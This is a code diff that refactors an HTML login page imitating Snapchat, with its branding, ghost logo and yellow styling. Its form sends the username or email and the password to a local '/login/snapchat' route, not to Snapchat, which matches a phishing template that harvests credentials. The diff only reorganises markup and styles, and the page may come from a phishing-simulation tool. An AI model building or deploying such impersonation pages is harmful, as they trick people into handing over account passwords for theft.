@@ -5,77 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Snapchat - Log In</title>
     <link rel="stylesheet" href="/static/css/style.css">
-    <style>
-        body {
-            background: #fffc00;
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-        }
-        .card {
-            background: #fff;
-            border-radius: 16px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
-            padding: 32px 24px;
-            text-align: center;
-        }
-        .form-group input {
-            background: #f5f5f5;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            padding: 16px;
-            font-size: 15px;
-        }
-        .form-group input:focus {
-            border-color: #fffc00;
-            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.3);
-        }
-        .btn-primary {
-            background: #007bff;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 600;
-            padding: 14px;
-        }
-        .btn-primary:hover {
-            background: #0069d9;
-        }
-        .links {
-            margin-top: 16px;
-        }
-        .links a {
-            color: #007bff;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        .footer-text a {
-            color: #000;
-            font-weight: 700;
-        }
-    </style>
 </head>
-<body>
-    <div class="container" style="max-width: 400px;">
-        <div class="card">
-            <div class="snapchat-logo">
-                <div class="snapchat-ghost"></div>
-            </div>
-            <div class="snapchat-title">Log in</div>
+<body class="sc-body">
+    <div class="sc-wrapper">
+        <div class="sc-card">
+            <div class="sc-ghost"></div>
+            <h1>Log in</h1>
             <form action="/login/snapchat" method="POST">
-                <div class="form-group">
-                    <input type="text" name="email" placeholder="Username or email" required autofocus>
-                </div>
-                <div class="form-group">
-                    <input type="password" name="password" placeholder="Password" required>
-                </div>
-                <button type="submit" class="btn-primary">Log In</button>
+                <input type="text" name="email" placeholder="Username or email" required autofocus>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit" class="sc-login-btn">Log In</button>
             </form>
-            <div class="links">
-                <a href="#">Forgot your password?</a>
-            </div>
+            <a href="#" class="sc-forgot">Forgot your password?</a>
         </div>
-        <div class="card" style="margin-top: 12px; padding: 20px; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.15);">
-            <p class="footer-text">
-                New here? <a href="#">Create an account</a>
-            </p>
+        <div class="sc-signup-card">
+            New here? <a href="#">Create an account</a>
         </div>
     </div>
 </body>
